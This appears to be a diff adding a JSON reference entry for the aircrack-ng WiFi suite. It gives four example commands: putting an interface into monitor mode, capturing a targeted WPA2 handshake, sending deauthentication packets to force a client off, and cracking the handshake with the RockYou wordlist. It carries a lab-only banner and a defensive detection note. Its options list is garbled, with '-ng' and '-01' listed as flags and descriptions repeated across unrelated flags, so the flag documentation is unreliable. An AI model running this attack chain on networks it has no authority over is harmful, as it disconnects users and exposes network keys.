@@ -1,0 +1,87 @@
+{
+  "name": "aircrack-ng",
+  "display_name": "aircrack-ng",
+  "category": "General Security",
+  "source": "curated",
+  "purpose": "Complete suite of tools to assess WiFi network security. Focuses on monitoring, attacking, testing, and cracking 802.11 WEP, WPA-PSK, and WPA2-PSK keys. Includes airmon-ng, airodump-ng, aireplay-ng, and packetforge-ng.",
+  "install_check": "aircrack-ng",
+  "options": [
+    {
+      "flag": "-ng",
+      "description": "Put wireless interface into monitor mode (creates wlan0mon)."
+    },
+    {
+      "flag": "-ng",
+      "description": "Capture 4-way handshake on channel 6 for specific AP."
+    },
+    {
+      "flag": "-c",
+      "description": "Capture 4-way handshake on channel 6 for specific AP."
+    },
+    {
+      "flag": "--bssid",
+      "description": "Capture 4-way handshake on channel 6 for specific AP."
+    },
+    {
+      "flag": "-ng",
+      "description": "Send 5 deauthentication packets to disconnect client and force handshake."
+    },
+    {
+      "flag": "-0",
+      "description": "Send 5 deauthentication packets to disconnect client and force handshake."
+    },
+    {
+      "flag": "-a",
+      "description": "Send 5 deauthentication packets to disconnect client and force handshake."
+    },
+    {
+      "flag": "-ng",
+      "description": "Crack captured WPA2 handshake using RockYou dictionary."
+    },
+    {
+      "flag": "-w",
+      "description": "Crack captured WPA2 handshake using RockYou dictionary."
+    },
+    {
+      "flag": "-01",
+      "description": "Crack captured WPA2 handshake using RockYou dictionary."
+    }
+  ],
+  "examples": [
+    {
+      "level": "Beginner",
+      "cmd": "sudo airmon-ng start wlan0",
+      "placeholder_cmd": "sudo airmon-ng start wlan0",
+      "desc": "Put wireless interface into monitor mode (creates wlan0mon)."
+    },
+    {
+      "level": "Beginner",
+      "cmd": "sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
+      "placeholder_cmd": "sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
+      "desc": "Capture 4-way handshake on channel 6 for specific AP."
+    },
+    {
+      "level": "Intermediate",
+      "cmd": "sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+      "placeholder_cmd": "sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+      "desc": "Send 5 deauthentication packets to disconnect client and force handshake."
+    },
+    {
+      "level": "Intermediate",
+      "cmd": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
+      "placeholder_cmd": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
+      "desc": "Crack captured WPA2 handshake using RockYou dictionary."
+    }
+  ],
+  "mistakes": "",
+  "output": "",
+  "related": [
+    "Aircrack-ng Documentation"
+  ],
+  "mitre": [
+    "T1110 - Brute Force"
+  ],
+  "defensive": "Defenders can detect aircrack-ng via process execution monitoring, network-flow logs, and endpoint EDR rules.",
+  "banner": "Authorised targets and your own lab only.",
+  "cached_at": "2026-11-12T14:25:53.814462"
+}
